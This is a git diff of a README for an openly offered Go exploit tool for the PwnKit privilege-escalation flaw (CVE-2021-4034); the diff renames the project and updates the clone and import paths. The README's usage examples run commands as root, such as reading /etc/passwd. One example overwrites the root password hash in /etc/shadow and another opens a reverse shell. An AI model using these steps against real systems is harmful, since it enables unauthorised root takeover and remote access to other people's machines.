@@ -1,4 +1,4 @@
-# go-PwnKit
+# ez-pwnkit
 
 A pure-Go implementation of the **CVE-2021-4034 PwnKit** exploit.
 
@@ -9,8 +9,8 @@ The exploit use `syscall.ForkExec` to survive end of main program.
 ## Installation
 
 ```bash
-git clone git@github.com:OXDBXKXO/go-PwnKit.git
-cd go-PwnKit
+git clone https://github.com/OXDBXKXO/ez-pwnkit.git
+cd ez-pwnkit
 make
 ```
 
@@ -65,15 +65,15 @@ $> ./exploit -o -c "cat /etc/passwd"
 package main
 
 import (
-    "github.com/OXDBXKXO/go-PwnKit"
+    "github.com/OXDBXKXO/ez-pwnkit"
 )
 
 func main() {
     // Change root password to 'password'
-    gopwnkit.Command(`sed -i -e 's,^root:[^:]\+:,root:$6$eymNRCK.KxwDM6vu$idH0swGW1nsnLb8fT1QibUho5xg7uGJT7fuiheLZHIi9M4gTSk0qIOlUIk2Mm9/Nz5C.T4GkgkmLcK5BtOPkS0:,' etc/shadow`, false)
+    ez_pwnkit.Command(`sed -i -e 's,^root:[^:]\+:,root:$6$eymNRCK.KxwDM6vu$idH0swGW1nsnLb8fT1QibUho5xg7uGJT7fuiheLZHIi9M4gTSk0qIOlUIk2Mm9/Nz5C.T4GkgkmLcK5BtOPkS0:,' etc/shadow`, false)
 
     // Open a reverse-shell
-    gopwnkit.RevShell("127.0.0.1:1337")
+	ez_pwnkit.RevShell("127.0.0.1:1337")
 }
 
 ```
